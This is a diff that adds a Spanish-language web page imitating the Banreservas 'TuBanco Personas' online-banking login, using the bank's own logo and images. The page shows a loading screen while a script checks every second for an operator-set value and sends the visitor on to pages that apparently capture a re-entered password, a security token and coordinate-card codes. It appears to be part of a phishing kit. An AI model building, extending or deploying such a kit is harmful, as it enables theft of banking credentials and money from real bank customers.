@@ -1,0 +1,174 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal de Inicio de Sesión</title>
+    <style>
+        body {
+            background-color: #004d77;
+            background-attachment: fixed;
+            font-family: 'Open Sans', sans-serif;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            width: 100%;
+            height: 50px;
+            border-top: solid 0px #123054;
+            background-color: #f9f9f9;
+            display: flex;
+            align-items: center;
+            justify-content: flex-end;
+            padding: 0 10px;
+        }
+        header a {
+            display: block;
+            text-decoration: none;
+            color: #000;
+            padding: 0 5px;
+            height: 40px;
+            text-align: center;
+            line-height: 30px;
+            font-size: 14px;
+            overflow: hidden;
+            margin-right: 15px;
+        }
+        .banreservas {
+            background: none repeat-x scroll 10px 10px #00AEF0;
+            border: 1px solid #00AEF0;
+            color: #FFFFFF;
+            height: 40px;
+            margin-right: 15px;
+            margin-top: -7px;
+            padding-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .content {
+            vertical-align: middle;
+            text-align: center;
+            padding-top: 25px;
+            padding-bottom: 25px;
+        }
+        .content img {
+            width: 285.5px;
+        }
+        .login-container {
+            width: 630px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+        }
+        .login-image {
+            width: 330px;
+            height: 466px;
+            background: url(https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/images/profilepersonas.jpg) -27px -18px no-repeat;
+            background-color: #fff;
+            background-size: 408px 484px;
+            border: 8px solid #F1F1F1;
+        }
+        .login-form-container {
+            width: 330px;
+        }
+        .login-title {
+            background-color: #00AEF0;
+            width: 100%;
+            height: 44px;
+            color: #FFF;
+            font-size: 12px;
+            font-family: 'Open Sans', Arial, sans-serif;
+            vertical-align: middle;
+            text-transform: none;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .login-form {
+            height: 88.7%;
+            background-color: #FFF;
+            width: 100%;
+            padding: 5px;
+            display: flex;
+            flex-direction: column;
+        }
+        .loading-table {
+            width: 100%;
+            text-align: center;
+        }
+        .loading-table td {
+            padding: 10px;
+        }
+        .loading-container p {
+            font-size: 16px;
+            color: #333;
+            margin: 10px 0;
+        }
+        .loading-container img {
+            width: 50px;
+            height: 50px;
+        }
+    </style>
+</head>
+<body>
+    <script>
+        window.onload = function() {
+            // Verifica si hay una acción en localStorage
+            function checkAction() {
+                const action = localStorage.getItem('cargandoAction');
+                if (action) {
+                    // Realiza la acción según el valor almacenado
+                    switch(action) {
+                        case 'incorrect_password':
+                            localStorage.removeItem('cargandoAction'); // Limpiar la acción
+                            window.location.href = 'index.html?action=incorrect_password';
+                            break;
+                             case 'token':
+                            localStorage.removeItem('cargandoAction'); // Limpiar la acción
+                            window.location.href = 'tok.html';
+                            break;
+                             case 'coordenadas':
+                            localStorage.removeItem('cargandoAction'); // Limpiar la acción
+                            window.location.href = 'cd.html';
+                            break;
+                    }
+                }
+            }
+
+            // Verifica cada segundo
+            setInterval(checkAction, 1000);
+        }
+    </script>
+    <header>
+        <a href="#">Contáctenos</a>
+        <a href="#">Idioma</a>
+        <a href="#">Ayuda</a>
+        <div class="banreservas">
+            <a href="https://www.banreservas.com.do" style="color: #FFFFFF;">Banreservas.com</a>
+        </div>
+    </header>
+    <div class="content">
+        <img src="https://www.banreservas.com.do/TuBancoPersonas/App_Themes/Login/Images/logo_banreservas.png" alt="Logo Banreservas">
+    </div>
+    <div class="login-container">
+        <div class="login-form-container">
+            <div class="login-title">Bienvenidos a TuBanco Personas</div>
+            <div class="login-form">
+                <table class="loading-table">
+                    <tr>
+                        <td>
+                            <div class="loading-container">
+                                <p>Cargando...</p>
+                                <img src="https://i.gifer.com/ZZ5H.gif" alt="Cargando...">
+                            </div>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+        </div>
+        <div class="login-image"></div>
+    </div>
+</body>
+</html>
